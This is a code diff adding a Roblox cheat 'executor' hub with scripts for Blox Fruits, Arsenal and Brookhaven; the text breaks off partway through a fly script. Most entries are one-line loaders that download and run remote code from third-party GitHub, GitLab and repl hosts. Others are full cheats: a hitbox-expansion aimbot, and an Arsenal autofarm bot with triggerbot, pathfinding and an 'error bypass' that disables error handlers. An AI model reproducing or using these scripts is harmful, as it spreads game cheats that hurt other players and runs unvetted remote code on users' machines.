@@ -1,167 +1,1890 @@
 local Rs = game:GetService("ReplicatedStorage")
+local CoreGui = game.CoreGui
 
-if not Rs:FindFirstChild("Executor_By:ChimeraLle") then
-	local new = Instance.new("Folder",Rs)
-	new.Name = "Executor_By:ChimeraLle"
-	
+if not game:IsLoaded() then
+	game.Loaded:Wait()
+end
+
+local Scripts = {
+	bloxfruit = {
+		["2XHUB"] = [[loadstring(game:HttpGet('https://raw.githubusercontent.com/armch063/BF-1XLIIHUB-V3/main/README.md', true))()
+]],
+		["Aimbot no gui"] = [[coroutine.wrap(function()
+if getgenv().Settings then
+getgenv().setting = {
+ Players = nil,
+ EspPlayer = true,
+ Fov = 50,
+ Color = Color3.fromRGB(255,13,13),
+ LockPlayers = false,
+ FastAttack = true,
+ DeleteSounds = false
+};end;pcall(function() loadstring(game:HttpGet('https://raw.githubusercontent.com/kickTh/Scriptbloxfruit-/main/Aimbot_For_Mobile.lua'))(); end)
+return (getgenv().setting);
+end)();]],
+		["Autolevel up"] = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptpastebin/raw/main/MaxFast"))()]],
+		["Furk"] = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/UltraStuff/scripts2/main/bf", true))()]],
+		["Hoho Hub (Need key or you can use old script without key)"] = [[loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()]],
+		["Lunar Hub"] = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/Cve-Hub/LUNARHUBnewUI/main/Load.lua"))()
+--SCRIPT HoaPoyTv]],
+		["MAGMAHUB"] = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/PornHubScriptS/PornHubScriptS/main/BLOXFRUITPORNHUB", true))()]],
+		["Mana Hub (Needs key)"] = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/HazeNx/Euphoria/main/EuphoriaHUB.lua"))()]],
+		["Mango Hub"] = [[getgenv().WaterMark = false
+loadstring(game:HttpGet("https://gitlab.com/L1ZOT/mango-hub/-/raw/main/Mango-Bloxf-Fruits-Beta"))()]],
+		["Maru x Hub"] = [[loadstring(game:HttpGet('https://raw.githubusercontent.com/joi-droid/MaruHubBF/main/GOHANSSJ3'))()]],
+		["Mink x Hub"] = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/Beammodz/Minkx/main/Hub/Main/Lua/FreeScript/Mobile"))()]],
+		["Mukuru Hub"] = [[loadstring(game:HttpGet"https://raw.githubusercontent.com/xDepressionx/Free-Script/main/AllScript.lua")()]],
+		["Netna Hub"] = [[loadstring(game:HttpGet('https://raw.githubusercontent.com/NinoGod/NetnaYay/8d21ce23346c500c93bb8b4a71f7791e4058a70b/startload.lua'))()]],
+		["Neva Hub"] = [[loadstring(game:HttpGet('https://raw.githubusercontent.com/VEZ2/NEVAHUB/main/2'))()]],
+		["Playback X hub"] = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/NeaPchX2/Playback-X-HUB/main/Protected.lua.txt"))()]],
+		["RTN Hub"] = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/WindowsXp12/rtnhub/main/bloxfruit.lua"))()]],
+		["String X"] = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/StringV2/StringHub/main/BF.txt", true))()]],
+		["Thunder z (NEED KEY)"] = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/ThunderZ-05/HUB/main/Script"))()]],
+		["X1 Hub"] = [[loadstring(game:HttpGet("https://github.com/R12XHUB/X1HUB/files/8783467/Protected.lua.txt"))()]]
+	},
+
+	arsenal = {
+		["Aimbot no gui"] = [[function getplrsname() for i,v in pairs(game:GetChildren()) do if v.ClassName == "Players" then return v.Name end end end local players = getplrsname() local plr = game[players].LocalPlayer coroutine.resume(coroutine.create(function() while wait(1) do coroutine.resume(coroutine.create(function() for _,v in pairs(game[players]:GetPlayers()) do if v.Name ~= plr.Name and v.Character then v.Character.RightUpperLeg.CanCollide = false v.Character.RightUpperLeg.Transparency = 10 v.Character.RightUpperLeg.Size = Vector3.new(21,21,21) v.Character.LeftUpperLeg.CanCollide = false v.Character.LeftUpperLeg.Transparency = 10 v.Character.LeftUpperLeg.Size = Vector3.new(21,21,21) v.Character.HeadHB.CanCollide = false v.Character.HeadHB.Transparency = 10 v.Character.HeadHB.Size = Vector3.new(21,21,21) v.Character.HumanoidRootPart.CanCollide = false v.Character.HumanoidRootPart.Transparency = 10 v.Character.HumanoidRootPart.Size = Vector3.new(21,21,21) end end end)) end end))]],
+		["Aimhook"] = [[loadstring(game:HttpGet("https://gangofgang.gog-best.repl.co/aimhook/hook.lua"))()]],
+		["Arsenal Autofarm"] = [[-- Bot Settings
+getgenv().AimSens = 1/35; -- Aimbot sens
+getgenv().LookSens = 1/60; -- Aim while walking sens
+getgenv().PreAimDis = 45; -- if within 55 Studs then preaim
+getgenv().KnifeOutDis = 85; -- if within 85 Studs then swap back to gun
+getgenv().ReloadDis = 30; -- if over 50 Studs away then reload
+getgenv().RecalDis = 15; -- if player moves over this many studs then recalculate path to them
+
+-- Services
+local PathfindingService = game:GetService("PathfindingService");
+local Players = game:GetService("Players");
+local ReplicatedStorage = game:GetService("ReplicatedStorage");
+local RunService = game:GetService("RunService");
+local TweenService = game:GetService('TweenService');
+local VIM = game:GetService("VirtualInputManager");
+local UserInputService = game:GetService("UserInputService");
+
+-- Local Plr
+local Plr = Players.LocalPlayer;
+local Char = Plr.Character or Plr.CharacterAdded:Wait();
+local Head = Char:WaitForChild("Head", 1337);
+local Root = Char:WaitForChild("HumanoidRootPart", 1337);
+local Humanoid = Char:WaitForChild("Humanoid", 1337);
+
+-- GUI Stuff
+local MainMenu = Plr.PlayerGui:WaitForChild("Menew", 1337);
+local PlayButton = MainMenu:WaitForChild("Main", 1337).Play;
+local MainHUD = Plr.PlayerGui:WaitForChild("GUI", 1337);
+local TeamSelection = MainHUD:WaitForChild("TeamSelection", 1337);
+local Events = ReplicatedStorage:WaitForChild("Events", 1337);
+
+-- Team/Spawn Stuff
+local buttonColors = {"Blu", "Rd", "Ylw", "Grn"};
+
+-- error bypass
+for i,v in pairs(getconnections(game:GetService("ScriptContext").Error)) do v:Disable() end
+
+-- Simple ESP
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/SimpleESP.lua", true))()
+
+-- Current Path
+local currpath = PathfindingService:CreatePath({["WaypointSpacing"] = 5});
+
+-- Aimbot Vars
+local Camera = workspace.CurrentCamera;
+
+-- Mouse
+local Mouse = Plr:GetMouse();
+
+-- Map Spawns
+local Map = workspace:WaitForChild("Map", 1337)
+local Spawns = workspace:WaitForChild("Map", 1337):WaitForChild("Spawns", 1337)
+
+-- Ignore
+local RayIgnore = workspace:WaitForChild("Ray_Ignore", 1337)
+local MapIgnore = Map:WaitForChild("Ignore", 1337)
+
+-- Temp Vars
+local CurrentEquipped = "Gun";
+local ClosestPlr;
+local IsAiming;
+local InitialPosition;
+local WalkToObject;
+
+-- Get Closest plr
+local function getClosestPlr()
+	local nearestPlayer, nearestDistance
+	for _, player in pairs(Players:GetPlayers()) do
+		if player.TeamColor ~= Plr.TeamColor and player ~= Plr then
+			local character = player.Character
+			if character then
+				local nroot = character:FindFirstChild("HumanoidRootPart")
+				if nroot and player:FindFirstChild("Status").Alive.Value then
+					if character.Humanoid and (character.Humanoid:GetState() ~= Enum.HumanoidStateType.Climbing and character.Humanoid:GetState() ~= Enum.HumanoidStateType.Freefall) then
+						local distance = Plr:DistanceFromCharacter(nroot.Position)
+						if (nearestDistance and distance >= nearestDistance) then continue end
+						nearestDistance = distance
+						nearestPlayer = player
+					end
+				end
+			end
+		end
+	end
+	return nearestPlayer
+end
+
+-- Wallcheck / Visible Check
+local function IsVisible(target, ignorelist)
+	local obsParts = Camera:GetPartsObscuringTarget({target}, ignorelist);
+
+	if #obsParts == 0 then
+		return true;
+	else
+		return false;
+	end
+end
+
+-- Aimbot/Triggerbot
+local function Aimlock()
+	-- Temp Holder
+	local aimpart = nil;
+
+	-- Detect first visible part
+	if ClosestPlr and ClosestPlr.Character then
+		for i,v in ipairs(ClosestPlr.Character:GetChildren()) do
+			if v and v:IsA("Part") then -- is part
+				if IsVisible(v.Position,{Camera,Char,ClosestPlr.Character,RayIgnore,MapIgnore}) then -- is visible
+					aimpart = v;
+					break;
+				end
+			end
+		end
+	end
+
+	-- If visible aim and shoot
+	if aimpart then
+		IsAiming = true;
+		-- Aim at player
+		local tcamcframe = Camera.CFrame;
+		for i = 0, 1, AimSens do
+			if not aimpart then break; end
+			if (Head.Position.Y + aimpart.Position.Y) < 0 then break; end -- Stop bot from aiming at the ground
+			Camera.CFrame = tcamcframe:Lerp(CFrame.new(Camera.CFrame.p, aimpart.Position), i)
+			task.wait(0)
+		end
+
+		-- Mouse down and back up
+		VIM:SendMouseButtonEvent(Mouse.X, Mouse.Y, 0, true, game, 1)
+		task.wait(0.25)
+		VIM:SendMouseButtonEvent(Mouse.X, Mouse.Y, 0, false, game, 1)
+	end
+
+	IsAiming = false;
+end
+
+-- Auto Spawn
+local function AutoSpawn()
+	if MainMenu.Enabled then
+		-- Fire play button
+		for i,v in pairs(getconnections(PlayButton.MouseButton1Down)) do
+		   v:Fire();
+		end
+		
+		-- Wait for GUI to change
+		repeat task.wait(1) until TeamSelection.Visible;
+		
+		-- Buttons check and auto team select
+		if TeamSelection:FindFirstChild("Buttons").Visible then -- normal
+			for i, teamButton in pairs(TeamSelection:FindFirstChild("Buttons"):GetChildren()) do
+				if table.find(buttonColors, teamButton.Name) and not teamButton.lock.Visible then
+					for i,v in pairs(getconnections(teamButton.MouseButton1Down)) do
+					   v:Fire();
+					end
+					break;
+				end
+			end
+		elseif TeamSelection:FindFirstChild("ButtonsFFA").Visible then -- FFA
+			for i,v in pairs(getconnections(TeamSelection:FindFirstChild("ButtonsFFA").FFA.MouseButton1Down)) do
+				v:Fire();
+			end
+		end
+	end
+end
+
+-- Pathfinding to Plr function
+WalkToObject = function()
+	if ClosestPlr and ClosestPlr.Character then
+		-- RootPart
+		local CRoot = ClosestPlr.Character:FindFirstChild("HumanoidRootPart")
+		if CRoot then
+			-- Get start position
+			InitialPosition = CRoot.Position;
+			
+			-- Calculate path
+			local success, errorMessage = pcall(function()
+				currpath:ComputeAsync(Root.Position, CRoot.Position)
+			end)
+			
+			if success and currpath.Status == Enum.PathStatus.Success then
+				local waypoints = currpath:GetWaypoints();
+
+				-- Navigate to each waypoint
+				for i, wap in pairs(waypoints) do
+					-- Catcher
+					if i == 1 then continue end -- skip first waypoint
+					if not ClosestPlr or not ClosestPlr.Character or ClosestPlr ~= getClosestPlr() or not ClosestPlr:FindFirstChild("Status").Alive.Value or not Plr:FindFirstChild("Status").Alive.Value then
+						ClosestPlr = nil;
+						return;
+					elseif (InitialPosition - CRoot.Position).Magnitude > RecalDis  then -- moved too far from start
+						WalkToObject(); -- restart
+						return;
+					end
+
+					-- Detect if needing to jump
+					if wap.Action == Enum.PathWaypointAction.Jump and Humanoid and Humanoid.Jump == false then
+						Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+					end
+
+					-- Aim while walking (either path or plr)
+					task.spawn(function()
+						local primary = ClosestPlr.Character.PrimaryPart.Position;
+						local studs = Plr:DistanceFromCharacter(primary)
+
+						local tcamcframe = Camera.CFrame;
+						for i = 0, 1, LookSens do
+							if IsAiming then break; end
+							if primary and studs then
+								-- If close aim at player
+								if math.floor(studs + 0.5) < PreAimDis then
+									if ClosestPlr and ClosestPlr.Character then
+										local CChar = ClosestPlr.Character;
+										if Char:FindFirstChild("Head") and CChar and CChar:FindFirstChild("Head") then
+											local MiddleAim = (Vector3.new(wap.Position.X,Char.Head.Position.Y,wap.Position.Z) + Vector3.new(CChar.Head.Position.X,CChar.Head.Position.Y,CChar.Head.Position.Z))/2;
+											Camera.CFrame = tcamcframe:Lerp(CFrame.new(Camera.CFrame.p, MiddleAim), i);
+										end
+									end
+								else -- else aim at waypoint
+									local mixedaim = (Camera.CFrame.p.Y + Char.Head.Position.Y)/2;
+									Camera.CFrame = tcamcframe:Lerp(CFrame.new(Camera.CFrame.p, Vector3.new(wap.Position.X,mixedaim,wap.Position.Z)), i);
+								end
+							end
+							task.wait(0)
+						end
+					end)
+
+					-- Auto Knife out (for faster running and realism)
+					task.spawn(function()
+						local primary = ClosestPlr.Character.PrimaryPart.Position;
+						local studs = Plr:DistanceFromCharacter(primary)
+
+						if primary and studs then
+							local arms = Camera:FindFirstChild("Arms");
+							if arms then
+								arms = arms:FindFirstChild("Real");
+								if math.floor(studs + 0.5) > KnifeOutDis and not IsVisible(primary, {Camera,Char,ClosestPlr.Character,RayIgnore,MapIgnore}) then
+									if arms.Value ~= "Knife" and CurrentEquipped == "Gun" then
+										VIM:SendKeyEvent(true, Enum.KeyCode.Q, false, game);
+										CurrentEquipped = "Knife";
+									end
+								elseif arms.Value == "Knife" and CurrentEquipped ~= "Gun" then
+									VIM:SendKeyEvent(true, Enum.KeyCode.Q, false, game);
+									CurrentEquipped = "Gun";
+								end
+							end
+						end
+					end)
+
+					-- Move to Waypoint
+					if Humanoid then
+						Humanoid:MoveTo(wap.Position);
+						Humanoid.MoveToFinished:Wait(); -- Wait for us to get to Waypoint
+					end
+				end
+			else
+				-- Can't find path, move to a random spawn.
+				warn("[AimmyAI] - Unable to calculate path!");
+				WalkToObject(); -- restart
+			end
+		end
+	end
+end
+
+-- Walk to the Plr
+local function WalkToPlr()
+	-- Get Closest Plr
+	ClosestPlr = getClosestPlr();
+
+	-- Walk to Plr
+	if ClosestPlr and ClosestPlr.Character and ClosestPlr.Character:FindFirstChild("HumanoidRootPart") then
+		if Humanoid.WalkSpeed > 0 and Plr:FindFirstChild("Status").Alive.Value and ClosestPlr:FindFirstChild("Status").Alive.Value then
+			--Create ESP
+			local studs = Plr:DistanceFromCharacter(ClosestPlr.Character.PrimaryPart.Position)
+			SESP_Create(ClosestPlr.Character.Head, ClosestPlr.Name, "TempTrack", Color3.new(1, 0, 0), math.floor(studs + 0.5));
+
+			-- Auto Reload (if next plr is far enough and out of site)
+			if math.floor(studs + 0.5) > ReloadDis and not IsVisible(ClosestPlr.Character.HumanoidRootPart.Position, {Camera,Char,ClosestPlr.Character,RayIgnore,MapIgnore}) then
+				VIM:SendKeyEvent(true, Enum.KeyCode.R, false, game)
+			end
+
+			-- AI Walk to Plr
+			WalkToObject(ClosestPlr.Character.HumanoidRootPart);
+		end
+	end
+end
+
+-- Loop Auto Spawn
+task.spawn(function()
+	while task.wait(0.5) do
+		AutoSpawn();
+	end
+end)
+
+-- Loop Pathfind
+task.spawn(function()
+	while task.wait() do
+		if (ClosestPlr == nil or ClosestPlr ~= getClosestPlr()) then
+			SESP_Clear("TempTrack");
+			WalkToPlr();
+		end
+	end
+end)
+
+-- Loop Aimlock
+task.spawn(function()
+	while task.wait() do
+		if ClosestPlr ~= nil and Camera then
+			if Plr:FindFirstChild("Status").Alive.Value and Humanoid.WalkSpeed > 0 then
+				Aimlock();
+			end
+		end
+	end
+end)
+
+
+-- Detect Stuck Bot
+local stuckamt = 0;
+task.spawn(function()
+	while task.wait(0.5) do
+		if Humanoid then
+			if Humanoid.MoveDirection.Magnitude == 0 then
+				if stuckamt == 5 then
+					-- Double jump
+					Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+					Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+					warn("[AimmyAI] - Attempting to jump out of stuck position..");
+					stuckamt = 0;
+				elseif stuckamt >= 10 then
+					SESP_Clear("TempTrack");
+					WalkToPlr();
+					warn("[AimmyAI] - Max stuck count, recalculating..");
+					stuckamt = 0;
+				end
+			end
+		end
+	end
+end)]],
+		["Arsenlean"] = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/KeoneGithub/KeoneGithub/main/Arsenal",true))()]],
+		["Boltsware"] = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/fusiongreg/BoltsHubV5/main/Main", true))()]],
+		["DarkHub (Needs key)"] = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Init", true))()]],
+		["Darkrai GUI"] = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/arsenal-hub/main/Arsenal%20GamingScripter", true))()]],
+		["INVISIBLE SERVERSIDE NO GUI"] = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/Cesare0328/my-scripts/main/arsenal%20updated%20invis.lua"))()]],
+		["NukeVsCity"] = [[_G.key = "kys" --the key is between the two " "
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NukeVsCity/TheALLHACKLoader/main/NukeLoader"))()]],
+		["OwlHub"] = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();]],
+		["RealZzHub"] = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/RealZzHub/MainV2/main/Main.lua"))()]]
+	},
+
+	brookhaven = {
+		["fly V3"] = [[local main = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local up = Instance.new("TextButton")
+local down = Instance.new("TextButton")
+local onof = Instance.new("TextButton")
+local TextLabel = Instance.new("TextLabel")
+local plus = Instance.new("TextButton")
+local speed = Instance.new("TextLabel")
+local mine = Instance.new("TextButton")
+local closebutton = Instance.new("TextButton")
+local mini = Instance.new("TextButton")
+local mini2 = Instance.new("TextButton")
+
+main.Name = "main"
+main.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+main.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+main.ResetOnSpawn = false
+
+Frame.Parent = main
+Frame.BackgroundColor3 = Color3.fromRGB(163, 255, 137)
+Frame.BorderColor3 = Color3.fromRGB(103, 221, 213)
+Frame.Position = UDim2.new(0.100320168, 0, 0.379746825, 0)
+Frame.Size = UDim2.new(0, 190, 0, 57)
+
+up.Name = "up"
+up.Parent = Frame
+up.BackgroundColor3 = Color3.fromRGB(79, 255, 152)
+up.Size = UDim2.new(0, 44, 0, 28)
+up.Font = Enum.Font.SourceSans
+up.Text = "UP"
+up.TextColor3 = Color3.fromRGB(0, 0, 0)
+up.TextSize = 14.000
+
+down.Name = "down"
+down.Parent = Frame
+down.BackgroundColor3 = Color3.fromRGB(215, 255, 121)
+down.Position = UDim2.new(0, 0, 0.491228074, 0)
+down.Size = UDim2.new(0, 44, 0, 28)
+down.Font = Enum.Font.SourceSans
+down.Text = "DOWN"
+down.TextColor3 = Color3.fromRGB(0, 0, 0)
+down.TextSize = 14.000
+
+onof.Name = "onof"
+onof.Parent = Frame
+onof.BackgroundColor3 = Color3.fromRGB(255, 249, 74)
+onof.Position = UDim2.new(0.702823281, 0, 0.491228074, 0)
+onof.Size = UDim2.new(0, 56, 0, 28)
+onof.Font = Enum.Font.SourceSans
+onof.Text = "fly"
+onof.TextColor3 = Color3.fromRGB(0, 0, 0)
+onof.TextSize = 14.000
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(242, 60, 255)
+TextLabel.Position = UDim2.new(0.469327301, 0, 0, 0)
+TextLabel.Size = UDim2.new(0, 100, 0, 28)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "Fly GUI V3"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+
+plus.Name = "plus"
+plus.Parent = Frame
+plus.BackgroundColor3 = Color3.fromRGB(133, 145, 255)
+plus.Position = UDim2.new(0.231578946, 0, 0, 0)
+plus.Size = UDim2.new(0, 45, 0, 28)
+plus.Font = Enum.Font.SourceSans
+plus.Text = "+"
+plus.TextColor3 = Color3.fromRGB(0, 0, 0)
+plus.TextScaled = true
+plus.TextSize = 14.000
+plus.TextWrapped = true
+
+speed.Name = "speed"
+speed.Parent = Frame
+speed.BackgroundColor3 = Color3.fromRGB(255, 85, 0)
+speed.Position = UDim2.new(0.468421042, 0, 0.491228074, 0)
+speed.Size = UDim2.new(0, 44, 0, 28)
+speed.Font = Enum.Font.SourceSans
+speed.Text = "1"
+speed.TextColor3 = Color3.fromRGB(0, 0, 0)
+speed.TextScaled = true
+speed.TextSize = 14.000
+speed.TextWrapped = true
+
+mine.Name = "mine"
+mine.Parent = Frame
+mine.BackgroundColor3 = Color3.fromRGB(123, 255, 247)
+mine.Position = UDim2.new(0.231578946, 0, 0.491228074, 0)
+mine.Size = UDim2.new(0, 45, 0, 29)
+mine.Font = Enum.Font.SourceSans
+mine.Text = "-"
+mine.TextColor3 = Color3.fromRGB(0, 0, 0)
+mine.TextScaled = true
+mine.TextSize = 14.000
+mine.TextWrapped = true
+
+closebutton.Name = "Close"
+closebutton.Parent = main.Frame
+closebutton.BackgroundColor3 = Color3.fromRGB(225, 25, 0)
+closebutton.Font = "SourceSans"
+closebutton.Size = UDim2.new(0, 45, 0, 28)
+closebutton.Text = "X"
+closebutton.TextSize = 30
+closebutton.Position =  UDim2.new(0, 0, -1, 27)
+
+mini.Name = "minimize"
+mini.Parent = main.Frame
+mini.BackgroundColor3 = Color3.fromRGB(192, 150, 230)
+mini.Font = "SourceSans"
+mini.Size = UDim2.new(0, 45, 0, 28)
+mini.Text = "-"
+mini.TextSize = 40
+mini.Position = UDim2.new(0, 44, -1, 27)
+
+mini2.Name = "minimize2"
+mini2.Parent = main.Frame
+mini2.BackgroundColor3 = Color3.fromRGB(192, 150, 230)
+mini2.Font = "SourceSans"
+mini2.Size = UDim2.new(0, 45, 0, 28)
+mini2.Text = "+"
+mini2.TextSize = 40
+mini2.Position = UDim2.new(0, 44, -1, 57)
+mini2.Visible = false
+
+speeds = 1
+
+local speaker = game:GetService("Players").LocalPlayer
+
+local chr = game.Players.LocalPlayer.Character
+local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
+
+nowe = false
+
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+	Title = "Fly GUI V3";
+	Text = "by mwrkz";
+	Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
+Duration = 5;
+
+Frame.Active = true -- main = gui
+Frame.Draggable = true
+
+onof.MouseButton1Down:connect(function()
+
+	if nowe == true then
+		nowe = false
+
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,true)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,true)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,true)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,true)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,true)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,true)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,true)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,true)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,true)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,true)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,true)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,true)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,true)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,true)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,true)
+		speaker.Character.Humanoid:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
+	else 
+		nowe = true
+
+
+
+		for i = 1, speeds do
+			spawn(function()
+
+				local hb = game:GetService("RunService").Heartbeat	
+
+
+				tpwalking = true
+				local chr = game.Players.LocalPlayer.Character
+				local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
+				while tpwalking and hb:Wait() and chr and hum and hum.Parent do
+					if hum.MoveDirection.Magnitude > 0 then
+						chr:TranslateBy(hum.MoveDirection)
+					end
+				end
+
+			end)
+		end
+		game.Players.LocalPlayer.Character.Animate.Disabled = true
+		local Char = game.Players.LocalPlayer.Character
+		local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")
+
+		for i,v in next, Hum:GetPlayingAnimationTracks() do
+			v:AdjustSpeed(0)
+		end
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,false)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,false)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,false)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,false)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,false)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,false)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,false)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,false)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,false)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,false)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,false)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,false)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,false)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,false)
+		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,false)
+		speaker.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
+	end
+
+
+
+
+	if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R6 then
+
+
+
+		local plr = game.Players.LocalPlayer
+		local torso = plr.Character.Torso
+		local flying = true
+		local deb = true
+		local ctrl = {f = 0, b = 0, l = 0, r = 0}
+		local lastctrl = {f = 0, b = 0, l = 0, r = 0}
+		local maxspeed = 50
+		local speed = 0
+
+
+		local bg = Instance.new("BodyGyro", torso)
+		bg.P = 9e4
+		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
+		bg.cframe = torso.CFrame
+		local bv = Instance.new("BodyVelocity", torso)
+		bv.velocity = Vector3.new(0,0.1,0)
+		bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
+		if nowe == true then
+			plr.Character.Humanoid.PlatformStand = true
+		end
+		while nowe == true or game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 do
+			game:GetService("RunService").RenderStepped:Wait()
+
+			if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
+				speed = speed+.5+(speed/maxspeed)
+				if speed > maxspeed then
+					speed = maxspeed
+				end
+			elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
+				speed = speed-1
+				if speed < 0 then
+					speed = 0
+				end
+			end
+			if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
+				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
+				lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
+			elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
+				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
+			else
+				bv.velocity = Vector3.new(0,0,0)
+			end
+			--	game.Players.LocalPlayer.Character.Animate.Disabled = true
+			bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
+		end
+		ctrl = {f = 0, b = 0, l = 0, r = 0}
+		lastctrl = {f = 0, b = 0, l = 0, r = 0}
+		speed = 0
+		bg:Destroy()
+		bv:Destroy()
+		plr.Character.Humanoid.PlatformStand = false
+		game.Players.LocalPlayer.Character.Animate.Disabled = false
+		tpwalking = false
+
+
+
+
+	else
+		local plr = game.Players.LocalPlayer
+		local UpperTorso = plr.Character.UpperTorso
+		local flying = true
+		local deb = true
+		local ctrl = {f = 0, b = 0, l = 0, r = 0}
+		local lastctrl = {f = 0, b = 0, l = 0, r = 0}
+		local maxspeed = 50
+		local speed = 0
+
+
+		local bg = Instance.new("BodyGyro", UpperTorso)
+		bg.P = 9e4
+		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
+		bg.cframe = UpperTorso.CFrame
+		local bv = Instance.new("BodyVelocity", UpperTorso)
+		bv.velocity = Vector3.new(0,0.1,0)
+		bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
+		if nowe == true then
+			plr.Character.Humanoid.PlatformStand = true
+		end
+		while nowe == true or game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 do
+			wait()
+
+			if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
+				speed = speed+.5+(speed/maxspeed)
+				if speed > maxspeed then
+					speed = maxspeed
